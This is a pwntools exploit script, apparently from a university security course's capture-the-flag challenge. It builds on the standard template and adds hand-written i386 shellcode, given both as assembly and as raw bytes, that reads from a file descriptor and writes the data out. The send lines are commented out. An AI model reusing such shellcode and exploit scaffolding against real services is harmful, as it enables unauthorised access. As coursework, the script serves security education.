#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./simple --host misc.6447.sec.edu.au --port 8005
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./simple')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'misc.6447.sec.edu.au'
port = int(args.PORT or 8005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()

'''
mov    eax,0x3        
mov    ebx,0x3e8      
mov    ecx,eax
mov    edx,0x6        
int    0x80           
mov    eax,0x4        
mov    ebx,eax       
mov    ecx,0xf7f9ed80 
mov    edx,0xf        
int    0x80           

'''
#io.recvuntil("shellcode:")
payload="\xB8\x03\x00\x00\x00\xBB\xE8\x03\x00\x00\x89\xC1\xBA\x06\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\x89\xC3\xB9\x80\xED\xF9\xF7\xBA\x0F\x00\x00\x00\xCD\x80"
print payload
#io.sendline(payload)
#io.interactive()

